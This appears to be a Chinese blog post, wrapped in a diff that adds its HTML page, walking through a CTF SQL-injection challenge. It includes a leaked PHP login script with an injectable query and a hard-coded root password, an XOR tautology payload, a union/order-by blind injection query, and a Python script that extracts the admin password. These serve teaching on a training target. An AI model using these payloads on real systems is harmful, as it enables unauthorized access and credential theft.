@@ -1,0 +1,322 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Ant Park">
+    <title>SQL注入① - Ant Park</title>
+    <meta name="author" content="Yuan Shen">
+    
+    
+        <link rel="icon" href="http://yoursite.com/assets/images/yuan.png">
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuan Shen","sameAs":[],"image":"yuan.jpg"},"articleBody":"一道简单的SQL注入题，由蓝鲸安全平台提供\n题目：后台好黑….什么都看不到啊……，答题地址：http://ctf.whaledu.com:10801/47g256f48gff/\n\n\n背景知识Union盲注当有时候网站对参数过滤的非常严格，例如以下规则：$filterlist = &quot;/\\(|\\)|username|password|where|case|when|like|regexp|into|limit|=|for|;/&quot;;\n大致总结如下：\n\n没有了括号，标志着没有办法用mysql里的函数\n没有了password，但是它却是字段名，所以sql语句中不能出现password这个列名。\n\n也就是说，当我们不能使用mysql的函数和对指定的列表进行查询怎么办？\n\n\n利用自己是mysql数据库进行实验：\n\n发现mysql的字符串排序操作是从前往后依次用ascii码对比的，所以我们可以利用这个特性注入。\n\n我们可以控制我们要查询的字段（例子中是第三列，所以根据第三列一一order by 3 ），让其从ascii码中可打印字符开始变化（48~127）然后不断去排序，当我们的猜测刚好比真正的数据大1时，我们的数据就会被排列到最上方，那么如果该语句接入的用户验证或者数据显示等地方，页面就会发生变化，我们以这个变化为临界点就能构造盲注了。\n\n注意的是数据库的系统和函数使用，当然可以在调试脚本时候发现。如果我们要从小到大的查询，那么desc的降序排列是必须的，但是如果网页过滤了desc可以使用吗？其实也可以，只需要更改查询顺序，从大到小就可以了（127，48），而且如果使用desc那么临界点的地方我们猜测的数据应该比数据库中的大一。如果是升序，那么临界点就刚好是真是数据。\n\n\n题目解析使用源码泄露工具dirsearch-master，扫描该网址是否存在源码泄露，指令如下：\n1python3 dirsearch.py -u http://ctf.whaledu.com:10801/47g256f48gff/ -e php\n\n发现三个可疑的url，逐个查看发现，index.php~后缀的url存在源码泄露，找到备份文件，查看源代码：\n123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php  $dbhost = &quot;localhost&quot;;  $dbuser = &quot;root&quot;;  $dbpass = &quot;123456&quot;;  $db = &quot;ctf&quot;;  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);  mysqli_set_charset($conn,&quot;utf8&quot;);   /* sql      create  table `admin` (        `id` int(10) not null primary key auto_increment,        `username` varchar(20) not null ,        `password` varchar(32) not null     );  */function   filter($str)&#123;      $filterlist = &quot;/\\(|\\)|username|password|where|      case|when|like|regexp|into|limit|=|for|;/&quot;;      if(preg_match($filterlist,strtolower($str)))&#123;        die(&quot;illegal input!&quot;);      &#125;      return $str;  &#125;$username = isset($_POST[&apos;username&apos;])?filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);$password = isset($_POST[&apos;password&apos;])?filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);$sql = &quot;select * from admin where  username = &apos;$username&apos; and password = &apos;$password&apos; &quot;; $res = $conn -&gt; query($sql);if($res-&gt;num_rows&gt;0)&#123;  $row = $res -&gt; fetch_assoc();  if($row[&apos;id&apos;])&#123;     echo $row[&apos;username&apos;];  &#125;&#125;else&#123;   echo &quot;The content in the password column is the flag!&quot;;&#125; ?&gt;\n找到关键的说明，用户名的密码就是flag，所以应该需要注入。\n\n我们看到php源码中函数filter过滤的很严格，这些字符都不能出现。\n\n限制的比较坑的有如下两条：\n\n没有了括号，标志着没有办法用mysql里的函数\n没有了password，但是它却是字段名，所以sql语句中不能出现password这个列名。\n现在只能想办法利用union盲注测试\n根据sql语句我们构造如下（注意自己测试列数）：\n\n1select * from admin where username='admin' union distinct select 1,2,0x38 order by 3 desc;\n\n我们可以控制后面的那个查询的第三个字段，让他从最小开始变化，当查询结果第一条返回的username字段是2的时候，就可以知道这个字符的ascii码减一就是跟数据库中的相等，所以就可以一位一位的猜出来password字段了。\n我们得先知道username是什么，所以需要一个不在过滤范围内的万能密钥。想到一个互斥运算符^(异或)，那么任何空字符串与0异或都能得1，我们就能得到恒真式了。\n提交username=&#39;^0#&amp;password=1，得到用户名为whaleadmin\n\n\n接着使用爆破脚本就能够得到每个密码了\n1234567891011121314151617181920212223242526272829303132#!/usr/bin/python# coding:utf-8import requestsdef makeStr(begin, end):    str = \"\"    for i in range(begin, end):        str += chr(i)    return strdef getPassword():    url = \"http://ctf.whaledu.com:10801/47g256f48gff/index.php\"    testStr = makeStr(48, 127)    username = \"whaleadmin' union distinct select 1,2,0x&#123;hex&#125; order by 3 desc#\"    flag = \"\"    for _ in range(32):        for i in testStr:            data = &#123;\"username\": username.format(hex=(flag + i).encode('hex')), \"password\": '1'&#125;            res = requests.post(url, data)            if \"whaleadmin\" not in res.text:                flag = flag + chr(ord(i) - 1)                print flag                break            else:                print \"[*]\", iif __name__ == '__main__':    getPassword()\n最终cmd5查询密码或者md5本地爆破都能知道密码：\n\n总结要想完全理解本题，需要大家先了解SQL注入相关原理，并且自己通过搭建mysql数据库，进行实际测试，在网站过滤了大部分的参数后，union联合注入是CTF比赛中常见的类型，SQL注入攻击的核心之一就是找到可控的临界点。\n","dateCreated":"2018-11-15T22:24:52+08:00","dateModified":"2018-11-15T23:25:15+08:00","datePublished":"2018-11-15T22:24:52+08:00","description":"一道简单的SQL注入题，由蓝鲸安全平台提供\n题目：后台好黑….什么都看不到啊……，答题地址：http://ctf.whaledu.com:10801/47g256f48gff/","headline":"SQL注入①","image":["https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg","https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2018/11/15/SQL注入①/"},"publisher":{"@type":"Organization","name":"Yuan Shen","sameAs":[],"image":"yuan.jpg","logo":{"@type":"ImageObject","url":"yuan.jpg"}},"url":"http://yoursite.com/2018/11/15/SQL注入①/","keywords":"Web, SQL注入, union","thumbnailUrl":"https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg"}</script>
+    <meta name="description" content="一道简单的SQL注入题，由蓝鲸安全平台提供 题目：后台好黑….什么都看不到啊……，答题地址：http://ctf.whaledu.com:10801/47g256f48gff/">
+<meta name="keywords" content="Web,SQL注入,union">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="SQL注入①">
+<meta property="og:url" content="http://yoursite.com/2018/11/15/SQL注入①/index.html">
+<meta property="og:site_name" content="Ant Park">
+<meta property="og:description" content="一道简单的SQL注入题，由蓝鲸安全平台提供 题目：后台好黑….什么都看不到啊……，答题地址：http://ctf.whaledu.com:10801/47g256f48gff/">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fx95kl5pyjj31mq0hytys.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fx94g3jfrsj30mm04uwfb.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fx94j4lxu3j30q809kmy8.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fx94kcodk9j30qa09uq4d.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fx95cwfmzcj31gm0kc0x7.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fx94xy8560j30vw0a00ti.jpg">
+<meta property="og:updated_time" content="2018-11-15T15:25:15.002Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入①">
+<meta name="twitter:description" content="一道简单的SQL注入题，由蓝鲸安全平台提供 题目：后台好黑….什么都看不到啊……，答题地址：http://ctf.whaledu.com:10801/47g256f48gff/">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fx95kl5pyjj31mq0hytys.jpg">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://yoursite.com/assets/images/yuan.jpg"/>
+    
+    
+        <meta property="og:image" content="https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg" />
+    
+    
+        <meta property="og:image" content="https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg" />
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-du2xmrqdqrl2ollgeiw050kpl6l4nbyz7bumjuurjgsxyopifvukebxc9lqe.min.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Ant Park</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+            <img class="header-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+                </a>
+                <h4 class="sidebar-profile-name">Yuan Shen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>author.bio</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="首页"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="分类"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="标签"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="归档"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    post-header-cover--full"
+             style="background-image:url('https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg');"
+             data-behavior="4">
+            
+        </div>
+
+            <div id="main" data-behavior="4"
+                 class="hasCover
+                        hasCoverMetaOut
+                        hasCoverCaption">
+                
+<article class="post">
+    
+        <span class="post-header-cover-caption caption">Lonely</span>
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            SQL注入①
+        </h1>
+    
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>一道简单的SQL注入题，由蓝鲸安全平台提供</p>
+<p>题目：后台好黑….什么都看不到啊……，答题地址：<a href="http://ctf.whaledu.com:10801/47g256f48gff/" target="_blank" rel="noopener">http://ctf.whaledu.com:10801/47g256f48gff/</a></p>
+<a id="more"></a>
+<h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#背景知识"><span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Union盲注"><span class="toc-text">Union盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目解析"><span class="toc-text">题目解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Union盲注"><a href="#Union盲注" class="headerlink" title="Union盲注"></a>Union盲注</h3><p>当有时候网站对参数过滤的非常严格，例如以下规则：<code>$filterlist = &quot;/\(|\)|username|password|where|case|when|like|regexp|into|limit|=|for|;/&quot;;</code></p>
+<p>大致总结如下：</p>
+<ul>
+<li>没有了括号，标志着没有办法用mysql里的函数</li>
+<li><p>没有了password，但是它却是字段名，所以sql语句中不能出现password这个列名。</p>
+</li>
+<li><p>也就是说，当我们不能使用mysql的函数和对指定的列表进行查询怎么办？</p>
+</li>
+</ul>
+<p>利用自己是mysql数据库进行实验：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx95kl5pyjj31mq0hytys.jpg" alt=""></p>
+<p>发现mysql的字符串排序操作是从前往后依次用ascii码对比的，所以我们可以利用这个特性注入。</p>
+<ul>
+<li><p>我们可以控制我们要查询的字段（例子中是第三列，所以根据第三列一一order by 3 ），让其从ascii码中可打印字符开始变化（48~127）然后不断去排序，当我们的猜测刚好比真正的数据大1时，我们的数据就会被排列到最上方，那么如果该语句接入的用户验证或者数据显示等地方，页面就会发生变化，我们以这个变化为临界点就能构造盲注了。</p>
+</li>
+<li><p>注意的是数据库的系统和函数使用，当然可以在调试脚本时候发现。如果我们要从小到大的查询，那么desc的降序排列是必须的，但是如果网页过滤了desc可以使用吗？其实也可以，只需要更改查询顺序，从大到小就可以了（127，48），而且如果使用desc那么临界点的地方我们猜测的数据应该比数据库中的大一。如果是升序，那么临界点就刚好是真是数据。</p>
+</li>
+</ul>
+<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>使用源码泄露工具dirsearch-master，扫描该网址是否存在源码泄露，指令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://ctf.whaledu.com:10801/47g256f48gff/ -e php</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fx94g3jfrsj30mm04uwfb.jpg" alt=""></p>
+<p>发现三个可疑的url，逐个查看发现，index.php~后缀的url存在源码泄露，找到备份文件，查看源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $dbhost = &quot;localhost&quot;;</span><br><span class="line">  $dbuser = &quot;root&quot;;</span><br><span class="line">  $dbpass = &quot;123456&quot;;</span><br><span class="line">  $db = &quot;ctf&quot;;</span><br><span class="line">  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">  mysqli_set_charset($conn,&quot;utf8&quot;);</span><br><span class="line"> </span><br><span class="line">  /* sql</span><br><span class="line"> </span><br><span class="line">     create  table `admin` (</span><br><span class="line">        `id` int(10) not null primary key auto_increment,</span><br><span class="line">        `username` varchar(20) not null ,</span><br><span class="line">        `password` varchar(32) not null</span><br><span class="line">     );</span><br><span class="line">  */</span><br><span class="line">function   filter($str)&#123;</span><br><span class="line">      $filterlist = &quot;/\(|\)|username|password|where|</span><br><span class="line">      case|when|like|regexp|into|limit|=|for|;/&quot;;</span><br><span class="line">      if(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        die(&quot;illegal input!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br><span class="line">$username = isset($_POST[&apos;username&apos;])?</span><br><span class="line">filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);</span><br><span class="line">$password = isset($_POST[&apos;password&apos;])?</span><br><span class="line">filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);</span><br><span class="line">$sql = &quot;select * from admin where  username =</span><br><span class="line"> &apos;$username&apos; and password = &apos;$password&apos; &quot;;</span><br><span class="line"> </span><br><span class="line">$res = $conn -&gt; query($sql);</span><br><span class="line">if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">  $row = $res -&gt; fetch_assoc();</span><br><span class="line">  if($row[&apos;id&apos;])&#123;</span><br><span class="line">     echo $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;The content in the password column is the flag!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>找到关键的说明，用户名的密码就是flag，所以应该需要注入。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fx94j4lxu3j30q809kmy8.jpg" alt=""></p>
+<p>我们看到php源码中函数<code>filter</code>过滤的很严格，这些字符都不能出现。</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fx94kcodk9j30qa09uq4d.jpg" alt=""></p>
+<p>限制的比较坑的有如下两条：</p>
+<ul>
+<li>没有了括号，标志着没有办法用mysql里的函数</li>
+<li>没有了password，但是它却是字段名，所以sql语句中不能出现password这个列名。</li>
+<li>现在只能想办法利用union盲注测试</li>
+<li>根据sql语句我们构造如下（注意自己测试列数）：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">0x38</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>我们可以控制后面的那个查询的第三个字段，让他从最小开始变化，当查询结果第一条返回的username字段是2的时候，就可以知道这个字符的ascii码减一就是跟数据库中的相等，所以就可以一位一位的猜出来password字段了。</li>
+<li>我们得先知道username是什么，所以需要一个不在过滤范围内的万能密钥。想到一个互斥运算符<strong>^(异或)</strong>，那么任何空字符串与0异或都能得1，我们就能得到恒真式了。</li>
+<li>提交<code>username=&#39;^0#&amp;password=1</code>，得到用户名为<strong>whaleadmin</strong></li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx95cwfmzcj31gm0kc0x7.jpg" alt=""></p>
+<p>接着使用爆破脚本就能够得到每个密码了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeStr</span><span class="params">(begin, end)</span>:</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(begin, end):</span><br><span class="line">        str += chr(i)</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://ctf.whaledu.com:10801/47g256f48gff/index.php"</span></span><br><span class="line">    testStr = makeStr(<span class="number">48</span>, <span class="number">127</span>)</span><br><span class="line">    username = <span class="string">"whaleadmin' union distinct select 1,2,0x&#123;hex&#125; order by 3 desc#"</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> testStr:</span><br><span class="line">            data = &#123;<span class="string">"username"</span>: username.format(hex=(flag + i).encode(<span class="string">'hex'</span>)), <span class="string">"password"</span>: <span class="string">'1'</span>&#125;</span><br><span class="line">            res = requests.post(url, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"whaleadmin"</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag = flag + chr(ord(i) - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[*]"</span>, i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    getPassword()</span><br></pre></td></tr></table></figure>
+<p>最终cmd5查询密码或者md5本地爆破都能知道密码：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fx94xy8560j30vw0a00ti.jpg" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要想完全理解本题，需要大家先了解SQL注入相关原理，并且自己通过搭建mysql数据库，进行实际测试，在网站过滤了大部分的参数后，union联合注入是CTF比赛中常见的类型，SQL注入攻击的核心之一就是找到可控的临界点。</p>
+
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/SQL注入/">SQL注入</a> <a class="tag tag--primary tag--small t-link" href="/tags/Web/">Web</a> <a class="tag tag--primary tag--small t-link" href="/tags/union/">union</a>
+
+            </div>
+        
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2018 Yuan Shen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+        
+            <h4 id="about-card-name">Yuan Shen</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-vufjrm3fmbuttogo1hxuu0w9w0sesk5iyysjuguc2hdhufot9szxg8twijry.min.js"></script>
+<!--SCRIPTS END-->
+
+
+
+    </body>
+</html>
